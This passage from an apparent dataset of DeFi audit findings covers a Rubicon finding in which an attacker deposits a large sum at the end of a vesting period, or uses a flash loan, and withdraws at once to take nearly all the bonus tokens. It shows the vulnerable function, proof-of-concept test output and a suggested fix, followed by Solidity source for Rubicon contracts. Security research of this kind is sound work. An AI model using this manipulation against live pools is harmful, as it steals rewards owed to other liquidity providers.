shares immediately.\n6.  Since attacker hold the an overwhelming amount of shares in the pool, they will receive almost all the bonusToken (around 997 DAI) in the BathBuddy Vesting wallet, leaving behind dust amount of bonusToken in the wallet.\n7.  At this point, Alice decided to withdraw all her bathWETH LP token. She only received dust amount of 0.7 DAI as bonusTokens\n\nThe following code shows that the amount of bonusTokens a user is entitled is based on the user's current share in the pool amount = releasable * sharesWithdrawn/initialTotalSupply.\n\n<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87\n\nsolidity\n/// @inheritdoc IBathBuddy\n/// @dev Added and modified release function. Should be the only callable release function\nfunction release(\n    IERC20 token,\n    address recipient,\n    uint256 sharesWithdrawn,\n    uint256 initialTotalSupply,\n    uint256 poolFee\n) external override {\n    require(\n        msg.sender == beneficiary,\n        \"Caller is not the Bath Token beneficiary of these rewards\"\n    );\n    uint256 releasable = vestedAmount(\n        address(token),\n        uint64(block.timestamp)\n    ) released(address(token));\n    if (releasable  0) {\n        uint256 amount = releasable.mul(sharesWithdrawn).div(\n            initialTotalSupply\n        );\n        uint256 _fee = amount.mul(poolFee).div(10000);\n\n        ..SNIP..\n\n        uint256 amountWithdrawn = amount.sub(_fee);\n        token.transfer(recipient, amountWithdrawn);\n\n        _erc20Released[address(token)] += amount;\n        ..SNIP..\n    }\n}\n\n\n\nFollowing is the test output that demonstrates the above scenario:\n\njavascript\n  Contract: Rubicon Exchange and Pools Original Tests\n    Deployment\n      \u2713 is deployed (1783ms)\n    Bath House Initialization of Bath Pair and Bath Tokens\n      \u2713 Bath House is deployed and initialized (66ms)\n        new bathWETH! 0x237eda6f0102c1684caEbA3Ebd89e26a79258C6f\n      \u2713 WETH Bath Token for WETH asset is deployed and initialized (131ms)\n      \u2713 Init BathBuddy Vesting Wallet and Add BathBuddy to WETH BathToken Pool (54ms)\n      \u2713 Bath Pair is deployed and initialized w/ BathHouse (59ms)\n        undefined\n      \u2713 Alice deposit 50 WETH to WETH bathTokens (137ms)\n        undefined\n      \u2713 Bob deposit 50 WETH to WETH bathTokens (174ms)\nbathAssetInstance.bonusTokens.length = 1\nbathBuddyInstance (Vesting Wallet) has 1000 DAI\nbathBuddyInstance.vestedAmount(DAI) = 0.000413359788359788\nbathBuddyInstance.vestedAmount(DAI) = 500.000413359788359788 (End of 2nd week)\nbathBuddyInstance.vestedAmount(DAI) = 998.512318121693121693 (Last hour of the vesting period)\n0 DAI has been released from BathBuddy Vesting Wallet\nCharles has 8500 bathWETH token, 0 DAI, 0 WETH\nCharles withdraw all his bathWETH tokens\n997.338978147402060445 DAI has been released from BathBuddy Vesting Wallet\nCharles has 0 bathWETH token, 997.039776453957839827 DAI, 8497.45 WETH\nAlice has 5 bathWETH token, 0 DAI, 0 WETH\n998.075233164534207763 DAI has been released from BathBuddy Vesting Wallet\nAlice has 0 bathWETH token, 0.736034140627007674 DAI, 6.2731175 WETH\n      \u2713 Add Rewards (100 DAI) to BathBuddy Vesting Wallet  (749ms)\nbathAssetInstance: underlyingBalance() = 6.2768825 WETH, balanceOf = 6.2768825 WETH, Outstanding Amount = 0 WETH\n      \u2713 Debug]\n\n\nAttacker Charles deposited 8500 WETH to the pool and withdraw them immediately at the final hour, and obtained almost all of the bonusTokens (997 DAI). When Alice withdraw from the pool, she only received 0.7 DAI as bonusTokens.\n\nScript can be found <https://gist.github.com/xiaoming9090/2252f6b6f7e62fca20ecfbaac6f754f5\n\nNote: Due to some unknown issue with the testing environment, please create a new BathBuddy.released2 functions to fetch the amount of token already released.\n\n\nLoss of Fund for the users. BathToken LPs not able to receive the accured bonusToken that they are entitled to.\n\n",
                "Repair": "\nUpdate the reward mechanism to ensure that the bonusTokens are distribute fairly and rewards of each user are accured correctly.\n\nIn the above example, since Alice holds 50% of the shares in the pool throughout the majority of the reward period, she should be entitled to close to 50% to the rewards/bonus. Anyone who joins the pool at the last hour of the reward period should only be entitled to dust amount of bonusToken.\n\nAdditionally, \"spot\" (or current) share of the pool should not be used to determine the amount of bonusToken a user is entitled to as it is vulnerable to pool/share manipulation or flash-loan attack. Checkpointing mechanism should be implemented so that at the minimum, the user's amount of share in the previous block is used for determining the rewards. This make flash-loan attack infeasible as such attack has to happen within the same block/transaction.\n\nFor distributing bonus/rewards, I would suggest checking out a widely referenced Synthetix's Reward(https://github.com/Synthetixio/synthetix/blob/develop/contracts/StakingRewards.sol) Contract as I think that it would be more relevant than OZ's Vesting Wallet for this particular purpose.\n\nbghughes (Rubicon) confirmed(https://github.com/code-423n4/2022-05-rubicon-findings/issues/109)\n\nHickupHH3 (judge) commented(https://github.com/code-423n4/2022-05-rubicon-findings/issues/109#issuecomment-1156548855):\n  Great writeup and POC from the warden! #71(https://github.com/code-423n4/2022-05-rubicon-findings/issues/71) is a little similar, but instead of a flash loan, uses a different method of repeated deposits and withdrawals to achieve the same result.\n \n Because of the higher quality of this report, I'm using it as the primary issue.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: BUSL-1.1\n\n/// @title  The administrator contract of Rubicon Pools\n/// @author Rubicon DeFi Inc. - bghughes.eth\n/// @notice The BathHouse initializes proxy-wrapped bathTokens, manages approved strategists, and sets system variables\n\npragma solidity =0.7.6;\n\nimport \"./BathToken.sol\";\nimport \"../interfaces/IBathPair.sol\";\nimport \"../interfaces/IBathToken.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/proxy/TransparentUpgradeableProxy.sol\";\n\ncontract BathHouse {\n    /// *** Storage Variables ***\n\n    /// @notice Rubicon Bath House\n    string public name;\n\n    /// @notice The administrator of the Bath House contract\n    address public admin;\n\n    /// @notice The proxy administrator of Bath Tokens\n    address public proxyManager;\n\n    /// @notice The core Rubicon Market of the Pools system\n    address public RubiconMarketAddress;\n\n    /// @notice A mapping of approved strategists to access Pools liquidity\n    mapping(address => bool) public approvedStrategists;\n\n    /// @notice The initialization status of BathHouse\n    bool public initialized;\n\n    /// @notice If true, strategists are permissioned and must be approved by admin\n    bool public permissionedStrategists;\n\n    /// @notice Key, system-wide risk parameter for all liquity Pools\n    /// @notice This represents the proportion of a pool's underlying assets that must remain in the pool\n    /// @dev This protects a run on the bank scenario and ensures users can withdraw while allowing funds to be utilized for yield in the market\n    uint256 public reserveRatio;\n\n    /// @notice A variable time delay after which a strategist must return funds to the Bath Token\n    uint256 public timeDelay;\n\n    /// @notice The lone Bath Pair contract of the system which acts as the strategist entry point and logic contract\n    address public approvedPairContract;\n\n    /// @notice The basis point fee that is paid to strategists from LPs on capital that is successfully rebalanced to a Bath Token\n    uint8 public bpsToStrategists;\n\n    /// @notice Key mapping for determining the address of a Bath Token based on its underlying asset\n    /// @dev Source of truth mapping that logs all ERC20 Liquidity pools underlying asset => bathToken Address\n    mapping(address => address) public tokenToBathToken;\n\n    /// @notice The BathToken.sol implementation that any new bathTokens inherit\n    /// @dev The implementation of any ~newly spawned~ proxy-wrapped Bath Tokens via _createBathToken\n    address public newBathTokenImplementation;\n\n    /// *** Events ***\n\n    /// @notice An event that signals the creation of a new Bath Token\n    event LogNewBathToken(\n        address underlyingToken,\n        address bathTokenAddress,\n        address bathTokenFeeAdmin,\n        uint256 timestamp,\n        address bathTokenCreator\n    );\n\n    /// @notice An event that signals the permissionless spawning of a new Bath Token\n    event LogOpenCreationSignal(\n        ERC20 newERC20Underlying,\n        address spawnedBathToken,\n        uint256 initialNewBathTokenDeposit,\n        ERC20 pairedExistingAsset,\n        address pairedExistingBathToken,\n        uint256 pairedBathTokenDeposit,\n        address signaler\n    );\n\n    /// *** Modifiers ***\n\n    /// @notice This modifier enforces that only the admin can call these functions\n    modifier onlyAdmin() {\n        require(msg.sender == admin);\n        _;\n    }\n\n    /// *** External Functions ***\n\n    /// @notice The constructor-like initialization function\n    /// @dev Proxy-safe initialization of storage that sets key storage variables\n    /// @dev Admin is set to msg.sender\n    function initialize(\n        address market,\n        uint256 _reserveRatio,\n        uint256 _timeDelay,\n        address _newBathTokenImplementation,\n        address _proxyAdmin\n    ) external {\n        require(!initialized);\n        name = \"Rubicon Bath House\";\n        admin = msg.sender;\n        timeDelay = _timeDelay;\n\n        // Set Bath Token reserve ratio globally\n        require(_reserveRatio <= 100);\n        require(_reserveRatio > 0);\n        reserveRatio = _reserveRatio;\n\n        // Set BPS reward fee for successful strategist market-making\n        /// @notice [(10000 - {bpsToStrategists}) / 10000] BPS of MM-ing activity is passed to users\n        bpsToStrategists = 20;\n\n        // Set key storage variables\n        RubiconMarketAddress = market;\n        permissionedStrategists = true;\n        newBathTokenImplementation = _newBathTokenImplementation;\n        proxyManager = _proxyAdmin;\n\n        // Automatically approve admin as an approved strategist\n        approveStrategist(admin);\n\n        // Complete contract instantiation\n        initialized = true;\n    }\n\n    /// @notice Permissionless entry point to spawn a Bath Token while posting liquidity to a ~pair of Bath Tokens~\n    /// @notice Please note, creating a Bath Token in this fashion ~does not~ gaurentee markets will be made for the new pair. This function signals the desire to have a new pair supported on Rubicon for strategists to consider market-making for\n    /// @notice The best desiredPairedAsset to select is a popular quote currency. Many traditional systems quote in USD while the ETH quote is superior - the choice is yours sweet msg.sender\n    /// @dev The user must approve the bathHouse to spend their ERC20s\n    /// @dev The user can only spawn a Bath Token for an ERC20 that is not yet in the Pools system and they must post liquidity on the other side of the pair for an ~extant Bath Token~\n    function openBathTokenSpawnAndSignal(\n        ERC20 newBathTokenUnderlying,\n        uint256 initialLiquidityNew, // Must approve this contract to spend\n        ERC20 desiredPairedAsset, // Must be paired with an existing quote for v1\n        uint256 initialLiquidityExistingBathToken\n    ) external returns (address newBathToken) {\n        // Check that it doesn't already exist\n        require(\n            getBathTokenfromAsset(newBathTokenUnderlying) == address(0),\n            \"bathToken already exists for that ERC20\"\n        );\n        require(\n            getBathTokenfromAsset(desiredPairedAsset) != address(0),\n            \"bathToken does not exist for that desiredPairedAsset\"\n        );\n\n        // Spawn a bathToken for the new asset\n        address newOne = _createBathToken(newBathTokenUnderlying, address(0)); // NOTE: address(0) as feeAdmin means fee is paid to pool holders\n\n        // Deposit initial liquidity posted of newBathTokenUnderlying\n        require(\n            newBathTokenUnderlying.transferFrom(\n                msg.sender,\n                address(this),\n                initialLiquidityNew\n            ),\n            \"Couldn't transferFrom your initial liquidity - make sure to approve BathHouse.sol\"\n        );\n\n        newBathTokenUnderlying.approve(newOne, initialLiquidityNew);\n\n        // Deposit assets and send Bath Token shares to msg.sender\n        IBathToken(newOne).deposit(initialLiquidityNew, msg.sender);\n\n        // desiredPairedAsset must be pulled and deposited into bathToken\n        require(\n            desiredPairedAsset.transferFrom(\n                msg.sender,\n                address(this),\n                initialLiquidityExistingBathToken\n            ),\n            \"Couldn't transferFrom your initial liquidity - make sure to approve BathHouse.sol\"\n        );\n        address pairedPool = getBathTokenfromAsset((desiredPairedAsset));\n        desiredPairedAsset.approve(\n            pairedPool,\n            initialLiquidityExistingBathToken\n        );\n\n        // Deposit assets and send Bath Token shares to msg.sender\n        IBathToken(pairedPool).deposit(\n            initialLiquidityExistingBathToken,\n            msg.sender\n        );\n\n        // emit an event describing the new pair, underlyings and bathTokens\n        emit LogOpenCreationSignal(\n            newBathTokenUnderlying,\n            newOne,\n            initialLiquidityNew,\n            desiredPairedAsset,\n            pairedPool,\n            initialLiquidityExistingBathToken,\n            msg.sender\n        );\n\n        newBathToken = newOne;\n    }\n\n    /// ** Admin-Only Functions **\n\n    /// @notice An admin-only function to create a new Bath Token for any ERC20\n    function createBathToken(ERC20 underlyingERC20, address _feeAdmin)\n        external\n        onlyAdmin\n        returns (address newBathTokenAddress)\n    {\n        newBathTokenAddress = _createBathToken(underlyingERC20, _feeAdmin);\n    }\n\n    /// @notice A migration function that allows the admin to write arbitrarily to tokenToBathToken\n    function adminWriteBathToken(ERC20 overwriteERC20, address newBathToken)\n        external\n        onlyAdmin\n    {\n        tokenToBathToken[address(overwriteERC20)] = newBathToken;\n        emit LogNewBathToken(\n            address(overwriteERC20),\n            newBathToken,\n            address(0),\n            block.timestamp,\n            msg.sender\n        );\n    }\n\n    /// @notice Function to initialize and store the address of the ~lone~ bathPair contract for the Rubicon protocol\n    function initBathPair(\n        address _bathPairAddress,\n        uint256 _maxOrderSizeBPS,\n        int128 _shapeCoefNum\n    ) external onlyAdmin returns (address newPair) {\n        require(\n            approvedPairContract == address(0),\n            \"BathPair already approved\"\n        );\n        require(\n            IBathPair(_bathPairAddress).initialized() != true,\n            \"BathPair already initialized\"\n        );\n        newPair = _bathPairAddress;\n\n        IBathPair(newPair).initialize(_maxOrderSizeBPS, _shapeCoefNum);\n\n        approvedPairContract = newPair;\n    }\n\n    /// @notice Admin-only function to set a new Admin\n    function setBathHouseAdmin(address newAdmin) external onlyAdmin {\n        admin = newAdmin;\n    }\n\n    /// @notice Admin-only function to set a new Bath Token implementation\n    /// @dev Please note that all bathTokens created will use this abi\n    function setNewBathTokenImplementation(address newImplementation) external onlyAdmin {\n        newBathTokenImplementation = newImplementation;\n    }\n\n    /// @notice Admin-only function to approve a new permissioned strategist\n    function approveStrategist(address strategist) public onlyAdmin {\n        approvedStrategists[strategist] = true;\n    }\n\n    /// @notice Admin-only function to set whether or not strategists are permissioned\n    function setPermissionedStrategists(bool _new) external onlyAdmin {\n        permissionedStrategists = _new;\n    }\n\n    /// @notice Admin-only function to set timeDelay\n    function setCancelTimeDelay(uint256 value) external onlyAdmin {\n        timeDelay = value;\n    }\n\n    /// @notice Admin-only function to set reserveRatio\n    function setReserveRatio(uint256 rr) external onlyAdmin {\n        require(rr <= 100);\n        require(rr > 0);\n        reserveRatio = rr;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's timeDelay\n    function setBathTokenMarket(address bathToken, address newMarket)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setMarket(newMarket);\n    }\n\n    /// @notice Admin-only function to add a bonus token to a Bath Token's reward schema\n    function setBonusToken(address bathToken, address newBonusToken)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setBonusToken(newBonusToken);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's Bath House admin\n    function setBathTokenBathHouse(address bathToken, address newAdmin)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setBathHouse(newAdmin);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's feeBPS\n    function setBathTokenFeeBPS(address bathToken, uint256 newBPS)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setFeeBPS(newBPS);\n    }\n\n    /// @notice Admin-only function to approve the Bath Token's underlying token on the assigned market\n    /// @dev required in case the market address ever changes.. #battleScars\n    function bathTokenApproveSetMarket(address targetBathToken)\n        external\n        onlyAdmin\n    {\n        IBathToken(targetBathToken).approveMarket();\n    }\n\n    /// @notice Admin-only function to set a Bath Token's fee recipient (typically the Bath Token itself)\n    function setBathTokenFeeTo(address bathToken, address feeTo)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setFeeTo(feeTo);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's target Rubicon Market\n    function setMarket(address newMarket) external onlyAdmin {\n        RubiconMarketAddress = newMarket;\n    }\n\n    /// *** View Functions ***\n\n    // Getter Functions for parameters\n    function getMarket() external view returns (address) {\n        return RubiconMarketAddress;\n    }\n\n    function getReserveRatio() external view returns (uint256) {\n        return reserveRatio;\n    }\n\n    function getCancelTimeDelay() external view returns (uint256) {\n        return timeDelay;\n    }\n\n    /// @notice Returns the address of any bathToken in the system based on its corresponding underlying asset\n    function getBathTokenfromAsset(ERC20 asset) public view returns (address) {\n        return tokenToBathToken[address(asset)];\n    }\n\n    function getBPSToStrats() public view returns (uint8) {\n        return bpsToStrategists;\n    }\n\n    /// *** System Security Checks ***\n\n    /// @notice A function to check whether or not an address is an approved strategist\n    function isApprovedStrategist(address wouldBeStrategist)\n        external\n        view\n        returns (bool)\n    {\n        if (\n            approvedStrategists[wouldBeStrategist] == true ||\n            !permissionedStrategists\n        ) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    /// @notice A function to check whether or not an address is the approved system instance of BathPair.sol\n    function isApprovedPair(address pair) public view returns (bool outcome) {\n        pair == approvedPairContract ? outcome = true : outcome = false;\n    }\n\n    /// *** Internal Functions ***\n\n    /// @dev Low-level functionality to spawn a Bath Token using the OZ Transparent Upgradeable Proxy standard\n    /// @param underlyingERC20 The underlying ERC-20 asset that underlies the newBathTokenAddress\n    /// @param _feeAdmin Recipient of pool withdrawal fees, typically the pool itself\n    function _createBathToken(ERC20 underlyingERC20, address _feeAdmin)\n        internal\n        returns (address newBathTokenAddress)\n    {\n        require(initialized, \"BathHouse not initialized\");\n        address _underlyingERC20 = address(underlyingERC20);\n        require(\n            _underlyingERC20 != address(0),\n            \"Cant create bathToken for zero address\"\n        );\n\n        // Check that it isn't already logged in the registry\n        require(\n            tokenToBathToken[_underlyingERC20] == address(0),\n            \"bathToken already exists\"\n        );\n\n        // Creates a new bathToken that is upgradeable by the proxyManager\n        require(\n            newBathTokenImplementation != address(0),\n            \"no implementation set for bathTokens\"\n        );\n\n        // Note, the option of a fee recipient for pool withdrawls exists. For all pools this is set to the pool itself in production and is visible via ~feeTo~ on any respective contract\n        // Note, fee admin presently ignored in the Bath Token initialization() call via defaulting to itself; though, this is still upgradeable by the Bath House admin via\n        bytes memory _initData = abi.encodeWithSignature(\n            \"initialize(address,address,address)\",\n            _underlyingERC20,\n            (RubiconMarketAddress),\n            (_feeAdmin)\n        );\n\n\n            TransparentUpgradeableProxy newBathToken\n         = new TransparentUpgradeableProxy(\n            newBathTokenImplementation,\n            proxyManager,\n            _initData\n        );\n\n        // New Bath Token Address\n        newBathTokenAddress = address(newBathToken);\n\n        // Write to source-of-truth router mapping for this ERC-20 => Bath Token\n        tokenToBathToken[_underlyingERC20] = newBathTokenAddress;\n\n        // Log Data\n        emit LogNewBathToken(\n            _underlyingERC20,\n            newBathTokenAddress,\n            _feeAdmin,\n            block.timestamp,\n            msg.sender\n        );\n    }\n}\n\n\n/// SPDX-License-Identifier: Apache-2.0\n/// This contract is a derivative work of the open-source work of Oasis DEX: https://github.com/OasisDEX/oasis\n\n/// @title RubiconMarket.sol\n/// @notice Please see the repository for this code at https://github.com/RubiconDeFi/rubicon-protocol-v1;\n\npragma solidity =0.7.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n/// @notice DSAuth events for authentication schema\ncontract DSAuthEvents {\n    event LogSetAuthority(address indexed authority);\n    event LogSetOwner(address indexed owner);\n}\n\n/// @notice DSAuth library for setting owner of the contract\n/// @dev Provides the auth modifier for authenticated function calls\ncontract DSAuth is DSAuthEvents {\n    address public owner;\n\n    function setOwner(address owner_) external auth {\n        owner = owner_;\n        emit LogSetOwner(owner);\n    }\n\n    modifier auth() {\n        require(isAuthorized(msg.sender), \"ds-auth-unauthorized\");\n        _;\n    }\n\n    function isAuthorized(address src) internal view returns (bool) {\n        if (src == address(this)) {\n            return true;\n        } else if (src == owner) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n/// @notice DSMath library for safe math without integer overflow/underflow\ncontract DSMath {\n    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x + y) >= x, \"ds-math-add-overflow\");\n    }\n\n    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x - y) <= x, \"ds-math-sub-underflow\");\n    }\n\n    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\");\n    }\n\n    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        return x <= y ? x : y;\n    }\n\n    function max(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        return x >= y ? x : y;\n    }\n\n    function imin(int256 x, int256 y) internal pure returns (int256 z) {\n        return x <= y ? x : y;\n    }\n\n    function imax(int256 x, int256 y) internal pure returns (int256 z) {\n        return x >= y ? x : y;\n    }\n\n    uint256 constant WAD = 10**18;\n    uint256 constant RAY = 10**27;\n\n    function wmul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, y), WAD / 2) / WAD;\n    }\n\n    function rmul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, y), RAY / 2) / RAY;\n    }\n\n    function wdiv(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, WAD), y / 2) / y;\n    }\n\n    function rdiv(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, RAY), y / 2) / y;\n    }\n}\n\n// /// @notice ERC-20 interface as derived from EIP-20\n// contract ERC20 {\n//     function totalSupply() public view returns (uint256);\n\n//     function balanceOf(address guy) public view returns (uint256);\n\n//     function allowance(address src, address guy) public view returns (uint256);\n\n//     function approve(address guy, uint256 wad) public returns (bool);\n\n//     function transfer(address dst, uint256 wad) public returns (bool);\n\n//     function transferFrom(\n//         address src,\n//         address dst,\n//         uint256 wad\n//     ) public returns (bool);\n// }\n\n/// @notice Events contract for logging trade activity on Rubicon Market\n/// @dev Provides the key event logs that are used in all core functionality of exchanging on the Rubicon Market\ncontract EventfulMarket {\n    event LogItemUpdate(uint256 id);\n    event LogTrade(\n        uint256 pay_amt,\n        address indexed pay_gem,\n        uint256 buy_amt,\n        address indexed buy_gem\n    );\n\n    event LogMake(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt,\n        uint64 timestamp\n    );\n\n    event LogBump(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt,\n        uint64 timestamp\n    );\n\n    event LogTake(\n        bytes32 id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        address indexed taker,\n        uint128 take_amt,\n        uint128 give_amt,\n        uint64 timestamp\n    );\n\n    event LogKill(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt,\n        uint64 timestamp\n    );\n\n    event LogInt(string lol, uint256 input);\n\n    event FeeTake(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        ERC20 asset,\n        address indexed taker,\n        address feeTo,\n        uint256 feeAmt,\n        uint64 timestamp\n    );\n\n    event OfferDeleted(uint256 id);\n}\n\n/// @notice Core trading logic for ERC-20 pairs, an orderbook, and transacting of tokens\n/// @dev This contract holds the core ERC-20 / ERC-20 offer, buy, and cancel logic\ncontract SimpleMarket is EventfulMarket, DSMath {\n    uint256 public last_offer_id;\n\n    /// @dev The mapping that makes up the core orderbook of the exchange\n    mapping(uint256 => OfferInfo) public offers;\n\n    bool locked;\n\n    /// @dev This parameter is in basis points\n    uint256 internal feeBPS;\n\n    /// @dev This parameter provides the address to which fees are sent\n    address internal feeTo;\n\n    struct OfferInfo {\n        uint256 pay_amt;\n        ERC20 pay_gem;\n        uint256 buy_amt;\n        ERC20 buy_gem;\n        address owner;\n        uint64 timestamp;\n    }\n\n    /// @notice Modifier that insures an order exists and is properly in the orderbook\n    modifier can_buy(uint256 id) virtual {\n        require(isActive(id));\n        _;\n    }\n\n    /// @notice Modifier that checks the user to make sure they own the offer and its valid before they attempt to cancel it\n    modifier can_cancel(uint256 id) virtual {\n        require(isActive(id));\n        require(getOwner(id) == msg.sender);\n        _;\n    }\n\n    modifier can_offer() virtual {\n        _;\n    }\n\n    modifier synchronized() {\n        require(!locked);\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function isActive(uint256 id) public view returns (bool active) {\n        return offers[id].timestamp > 0;\n    }\n\n    function getOwner(uint256 id) public view returns (address owner) {\n        return offers[id].owner;\n    }\n\n    function getOffer(uint256 id)\n        public\n        view\n        returns (\n            uint256,\n            ERC20,\n            uint256,\n            ERC20\n        )\n    {\n        OfferInfo memory _offer = offers[id];\n        return (_offer.pay_amt, _offer.pay_gem, _offer.buy_amt, _offer.buy_gem);\n    }\n\n    /// @notice Below are the main public entrypoints\n\n    function bump(bytes32 id_) external can_buy(uint256(id_)) {\n        uint256 id = uint256(id_);\n        emit LogBump(\n            id_,\n            keccak256(abi.encodePacked(offers[id].pay_gem, offers[id].buy_gem)),\n            offers[id].owner,\n            offers[id].pay_gem,\n            offers[id].buy_gem,\n            uint128(offers[id].pay_amt),\n            uint128(offers[id].buy_amt),\n            offers[id].timestamp\n        );\n    }\n\n    /// @notice Accept a given `quantity` of an offer. Transfers funds from caller/taker to offer maker, and from market to caller/taker.\n    /// @notice The fee for taker trades is paid in this function.\n    function buy(uint256 id, uint256 quantity)\n        public\n        virtual\n        can_buy(id)\n        synchronized\n        returns (bool)\n    {\n        OfferInfo memory _offer = offers[id];\n        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;\n\n        require(uint128(spend) == spend, \"spend is not an int\");\n        require(uint128(quantity) == quantity, \"quantity is not an int\");\n\n        ///@dev For backwards semantic compatibility.\n        if (\n            quantity == 0 ||\n            spend == 0 ||\n            quantity > _offer.pay_amt ||\n            spend > _offer.buy_amt\n        ) {\n            return false;\n        }\n\n        // Fee logic added on taker trades\n        uint256 fee = mul(spend, feeBPS) / 10000;\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n            \"Insufficient funds to cover fee\"\n        );\n\n        offers[id].pay_amt = sub(_offer.pay_amt, quantity);\n        offers[id].buy_amt = sub(_offer.buy_amt, spend);\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, _offer.owner, spend),\n            \"_offer.buy_gem.transferFrom(msg.sender, _offer.owner, spend) failed - check that you can pay the fee\"\n        );\n        require(\n            _offer.pay_gem.transfer(msg.sender, quantity),\n            \"_offer.pay_gem.transfer(msg.sender, quantity) failed\"\n        );\n\n        emit LogItemUpdate(id);\n        emit LogTake(\n            bytes32(id),\n            keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n            _offer.owner,\n            _offer.pay_gem,\n            _offer.buy_gem,\n            msg.sender,\n            uint128(quantity),\n            uint128(spend),\n            uint64(block.timestamp)\n        );\n        emit FeeTake(\n            bytes32(id),\n            keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n            _offer.buy_gem,\n            msg.sender,\n            feeTo,\n            fee,\n            uint64(block.timestamp)\n        );\n        emit LogTrade(\n            quantity,\n            address(_offer.pay_gem),\n            spend,\n            address(_offer.buy_gem)\n        );\n\n        if (offers[id].pay_amt == 0) {\n            delete offers[id];\n            emit OfferDeleted(id);\n        }\n\n        return true;\n    }\n\n    /// @notice Allows the caller to cancel the offer if it is their own.\n    /// @notice This function refunds the offer to the maker.\n    function cancel(uint256 id)\n        public\n        virtual\n        can_cancel(id)\n        synchronized\n        returns (bool success)\n    {\n        OfferInfo memory _offer = offers[id];\n        delete offers[id];\n\n        require(_offer.pay_gem.transfer(_offer.owner, _offer.pay_amt));\n\n        emit LogItemUpdate(id);\n        emit LogKill(\n            bytes32(id),\n            keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n            _offer.owner,\n            _offer.pay_gem,\n            _offer.buy_gem,\n            uint128(_offer.pay_amt),\n            uint128(_offer.buy_amt),\n            uint64(block.timestamp)\n        );\n\n        success = true;\n    }\n\n    function kill(bytes32 id) external virtual {\n        require(cancel(uint256(id)));\n    }\n\n    function make(\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt\n    ) external virtual returns (bytes32 id) {\n        return bytes32(offer(pay_amt, pay_gem, buy_amt, buy_gem));\n    }\n\n    /// @notice Key function to make a new offer. Takes funds from the caller into market escrow.\n    function offer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem\n    ) public virtual can_offer synchronized returns (uint256 id) {\n        require(uint128(pay_amt) == pay_amt);\n        require(uint128(buy_amt) == buy_amt);\n        require(pay_amt > 0);\n        require(pay_gem != ERC20(0x0));\n        require(buy_amt > 0);\n        require(buy_gem != ERC20(0x0));\n        require(pay_gem != buy_gem);\n\n        OfferInfo memory info;\n        info.pay_amt = pay_amt;\n        info.pay_gem = pay_gem;\n        info.buy_amt = buy_amt;\n        info.buy_gem = buy_gem;\n        info.owner = msg.sender;\n        info.timestamp = uint64(block.timestamp);\n        id = _next_id();\n        offers[id] = info;\n\n        require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n\n        emit LogItemUpdate(id);\n        emit LogMake(\n            bytes32(id),\n            keccak256(abi.encodePacked(pay_gem, buy_gem)),\n            msg.sender,\n            pay_gem,\n            buy_gem,\n            uint128(pay_amt),\n            uint128(buy_amt),\n            uint64(block.timestamp)\n        );\n    }\n\n    function take(bytes32 id, uint128 maxTakeAmount) external virtual {\n        require(buy(uint256(id), maxTakeAmount));\n    }\n\n    function _next_id() internal returns (uint256) {\n        last_offer_id++;\n        return last_offer_id;\n    }\n\n    // Fee logic\n    function getFeeBPS() internal view returns (uint256) {\n        return feeBPS;\n    }\n}\n\n/// @notice Expiring market is a Simple Market with a market lifetime.\n/// @dev When the close_time has been reached, offers can only be cancelled (offer and buy will throw).\ncontract ExpiringMarket is DSAuth, SimpleMarket {\n    bool public stopped;\n\n    /// @dev After close_time has been reached, no new offers are allowed.\n    modifier can_offer() override {\n        require(!isClosed());\n        _;\n    }\n\n    /// @dev After close, no new buys are allowed.\n    modifier can_buy(uint256 id) override {\n        